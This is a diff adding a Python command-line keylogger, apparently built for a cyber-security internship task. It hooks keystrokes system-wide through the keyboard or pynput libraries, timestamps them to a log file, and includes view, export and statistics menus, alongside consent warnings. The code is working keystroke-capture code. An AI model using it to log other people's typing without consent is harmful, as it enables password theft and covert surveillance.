@@ -1,0 +1,364 @@
+# ============================================================
+#  SCT_CS_4 — Keylogger | CLI Version
+#  SkillCraft Technology | Cyber Security Internship
+#  Author : Iqra Raheem
+#
+#  TASK: Create a basic keylogger program that records and
+#        logs keystrokes. Focus on logging keys pressed and
+#        saving them to a file.
+#
+#  ⚠️  EDUCATIONAL PURPOSE ONLY
+#      Use only on your own device with your own consent.
+#
+#  Install (run once):
+#      pip install keyboard
+#  OR
+#      pip install pynput
+# ============================================================
+
+import os
+import sys
+import time
+from datetime import datetime
+
+LOG_FILE = "keylog.txt"
+
+# ══════════════════════════════════════════════════════════════
+#  DETECT AVAILABLE BACKEND
+# ══════════════════════════════════════════════════════════════
+
+BACKEND = None
+
+try:
+    import keyboard as kb_module
+    BACKEND = "keyboard"
+except ImportError:
+    pass
+
+if BACKEND is None:
+    try:
+        from pynput import keyboard as pynput_kb
+        BACKEND = "pynput"
+    except ImportError:
+        pass
+
+
+# ══════════════════════════════════════════════════════════════
+#  LOGGING CORE
+# ══════════════════════════════════════════════════════════════
+
+def write_log(entry):
+    """Append one entry to the log file."""
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(entry + "\n")
+
+
+def ts():
+    """Current timestamp string."""
+    return datetime.now().strftime("%H:%M:%S")
+
+
+# ── Backend: `keyboard` library ───────────────────────────────
+def start_logging_keyboard():
+    """
+    Uses the `keyboard` library.
+    Records every key press with timestamp until ESC is pressed.
+    """
+    key_count = [0]
+
+    def on_key(event):
+        if event.event_type != "down":
+            return
+        name = event.name
+        timestamp = ts()
+        if len(name) == 1:
+            entry = f"[{timestamp}] KEY     : {name}"
+        else:
+            entry = f"[{timestamp}] SPECIAL : {name.upper()}"
+        key_count[0] += 1
+        print(f"  {entry}")
+        write_log(entry)
+
+    hook = kb_module.on_press(on_key)
+    print(f"\n  🟢  Logging started — press ESC to stop\n")
+    kb_module.wait("esc")
+    kb_module.unhook(hook)
+    return key_count[0]
+
+
+# ── Backend: `pynput` library ─────────────────────────────────
+def start_logging_pynput():
+    """
+    Uses the `pynput` library.
+    Records every key press with timestamp until ESC is pressed.
+    """
+    from pynput import keyboard as pk
+    key_count = [0]
+    stop_flag = [False]
+
+    def on_press(key):
+        timestamp = ts()
+        try:
+            entry = f"[{timestamp}] KEY     : {key.char}"
+        except AttributeError:
+            name = str(key).replace("Key.", "").upper()
+            entry = f"[{timestamp}] SPECIAL : {name}"
+            if name == "ESC":
+                stop_flag[0] = True
+                return False   # stop listener
+
+        key_count[0] += 1
+        print(f"  {entry}")
+        write_log(entry)
+
+    print(f"\n  🟢  Logging started — press ESC to stop\n")
+    with pk.Listener(on_press=on_press) as listener:
+        listener.join()
+    return key_count[0]
+
+
+# ── Fallback: input()-based demo logger ───────────────────────
+def start_logging_fallback():
+    """
+    Works on ANY system with NO extra libraries.
+    User types lines; each character is logged individually.
+    Demonstrates the same logging/saving concept.
+    Type 'STOP' on a line by itself to finish.
+    """
+    print("\n  ℹ️   No keyboard hook library found.")
+    print("  Running in DEMO MODE — type text and press Enter.")
+    print("  Each character is individually timestamped and logged.")
+    print("  Type  STOP  and press Enter to finish.\n")
+    print(f"  🟢  Logging started\n")
+
+    key_count = 0
+    while True:
+        try:
+            line = input("  > ")
+        except (EOFError, KeyboardInterrupt):
+            break
+
+        if line.strip().upper() == "STOP":
+            break
+
+        # Log each character individually (simulates keystroke logging)
+        for char in line:
+            timestamp = ts()
+            if char == " ":
+                entry = f"[{timestamp}] KEY     : SPACE"
+            else:
+                entry = f"[{timestamp}] KEY     : {char}"
+            key_count += 1
+            print(f"  {entry}")
+            write_log(entry)
+
+        # Log the Enter key
+        entry = f"[{ts()}] SPECIAL : ENTER"
+        key_count += 1
+        print(f"  {entry}")
+        write_log(entry)
+
+    return key_count
+
+
+# ══════════════════════════════════════════════════════════════
+#  LOG FILE UTILITIES
+# ══════════════════════════════════════════════════════════════
+
+def view_log():
+    if not os.path.isfile(LOG_FILE):
+        print("\n  ⚠  No log file found yet. Start a logging session first.")
+        return
+    with open(LOG_FILE, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+    if not lines:
+        print("\n  Log file is empty.")
+        return
+
+    print(f"\n  ─── Log File: {os.path.abspath(LOG_FILE)} ───")
+    print(f"  Total entries: {len(lines)}\n")
+
+    # Show last 50 entries
+    display = lines[-50:]
+    for line in display:
+        print(f"  {line.rstrip()}")
+    if len(lines) > 50:
+        print(f"\n  … {len(lines) - 50} older entries not shown.")
+    print()
+
+
+def clear_log():
+    confirm = input("\n  Clear ALL log data? (yes/no): ").strip().lower()
+    if confirm == "yes":
+        with open(LOG_FILE, "w", encoding="utf-8") as f:
+            f.write("")
+        print("  ✅  Log file cleared.")
+    else:
+        print("  ↩  Cancelled.")
+
+
+def export_log():
+    if not os.path.isfile(LOG_FILE):
+        print("\n  ⚠  No log file to export.")
+        return
+    dest = input("\n  Export as (e.g. session1.txt): ").strip()
+    if not dest:
+        dest = f"keylog_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    if not dest.endswith(".txt"):
+        dest += ".txt"
+    with open(LOG_FILE, "r", encoding="utf-8") as f:
+        data = f.read()
+    with open(dest, "w", encoding="utf-8") as f:
+        f.write(data)
+    print(f"  ✅  Exported to: {os.path.abspath(dest)}")
+
+
+def log_stats():
+    if not os.path.isfile(LOG_FILE):
+        print("\n  ⚠  No log file found.")
+        return
+    with open(LOG_FILE, "r", encoding="utf-8") as f:
+        lines = [l.strip() for l in f if l.strip()]
+
+    regular = [l for l in lines if "KEY     :" in l]
+    special  = [l for l in lines if "SPECIAL :" in l]
+    sessions = [l for l in lines if "SESSION" in l]
+
+    # Character frequency
+    freq = {}
+    for line in regular:
+        parts = line.split("KEY     :")
+        if len(parts) == 2:
+            ch = parts[1].strip()
+            freq[ch] = freq.get(ch, 0) + 1
+
+    top5 = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:5]
+
+    print(f"\n  ─── Log Statistics ────────────────────────────────")
+    print(f"  📄  Log file     : {os.path.abspath(LOG_FILE)}")
+    print(f"  💾  File size    : {os.path.getsize(LOG_FILE) / 1024:.2f} KB")
+    print(f"  🔢  Total lines  : {len(lines)}")
+    print(f"  ⌨️   Regular keys : {len(regular)}")
+    print(f"  🎛️   Special keys : {len(special)}")
+    print(f"  📅  Sessions     : {len(sessions)}")
+    if top5:
+        print(f"\n  🏆  Top 5 most-pressed keys:")
+        for ch, count in top5:
+            bar = "█" * min(count, 30)
+            print(f"      '{ch}'  {bar} {count}x")
+    print()
+
+
+# ══════════════════════════════════════════════════════════════
+#  UI
+# ══════════════════════════════════════════════════════════════
+
+def banner():
+    print()
+    print("  ╔══════════════════════════════════════════════════════╗")
+    print("  ║   ⌨️   KEYLOGGER                                     ║")
+    print("  ║       SkillCraft Technology — Task 04 (SCT_CS_4)    ║")
+    print("  ║       Cyber Security Internship | Iqra Raheem       ║")
+    print("  ╠══════════════════════════════════════════════════════╣")
+    print("  ║  ⚠️  EDUCATIONAL PURPOSE ONLY                        ║")
+    print("  ║  Use only on YOUR OWN device with YOUR consent.     ║")
+    print("  ╚══════════════════════════════════════════════════════╝")
+
+    if BACKEND == "keyboard":
+        print("  ✅  Backend : keyboard library (full hook mode)")
+    elif BACKEND == "pynput":
+        print("  ✅  Backend : pynput library (listener mode)")
+    else:
+        print("  ⚠️   Backend : Demo mode (install `keyboard` for full hook)")
+        print("  👉  Run:  pip install keyboard")
+    print()
+
+
+def menu():
+    print("  ┌─────────────────────────────────────────────────────┐")
+    print("  │  MENU                                               │")
+    print("  ├─────────────────────────────────────────────────────┤")
+    print("  │  [1]  Start Logging  (records keystrokes to file)  │")
+    print("  │  [2]  View Log File  (last 50 entries)             │")
+    print("  │  [3]  Log Statistics (key counts, top keys)        │")
+    print("  │  [4]  Export Log     (save copy to new file)       │")
+    print("  │  [5]  Clear Log File                               │")
+    print("  │  [0]  Exit                                          │")
+    print("  └─────────────────────────────────────────────────────┘")
+
+
+def write_session_header():
+    header = (
+        f"\n{'=' * 46}\n"
+        f" SESSION START : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f" Log file      : {os.path.abspath(LOG_FILE)}\n"
+        f" Backend       : {BACKEND or 'demo/fallback'}\n"
+        f"{'=' * 46}\n"
+    )
+    write_log(header)
+
+
+def write_session_footer(key_count):
+    footer = (
+        f" SESSION END   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f" Keys logged   : {key_count}\n"
+        f"{'=' * 46}\n"
+    )
+    write_log(footer)
+
+
+# ══════════════════════════════════════════════════════════════
+#  MAIN
+# ══════════════════════════════════════════════════════════════
+
+def main():
+    banner()
+
+    while True:
+        menu()
+        choice = input("\n  Choose: ").strip()
+        print()
+
+        if choice == "1":
+            write_session_header()
+            print("  ─────────────────────────────────────────────────────")
+
+            try:
+                if BACKEND == "keyboard":
+                    count = start_logging_keyboard()
+                elif BACKEND == "pynput":
+                    count = start_logging_pynput()
+                else:
+                    count = start_logging_fallback()
+            except Exception as e:
+                print(f"\n  ⚠  Error during logging: {e}")
+                print("  Try running as Administrator (Windows) or with sudo (Linux/Mac).")
+                count = 0
+
+            write_session_footer(count)
+            print(f"\n  ⏹  Logging stopped.")
+            print(f"  📄  {count} keystrokes saved to: {os.path.abspath(LOG_FILE)}")
+            print()
+
+        elif choice == "2":
+            view_log()
+
+        elif choice == "3":
+            log_stats()
+
+        elif choice == "4":
+            export_log()
+
+        elif choice == "5":
+            clear_log()
+
+        elif choice == "0":
+            print("  Goodbye! Stay secure 🔐\n")
+            break
+
+        else:
+            print("  ⚠  Invalid option. Choose 0–5.\n")
+
+
+if __name__ == "__main__":
+    main()
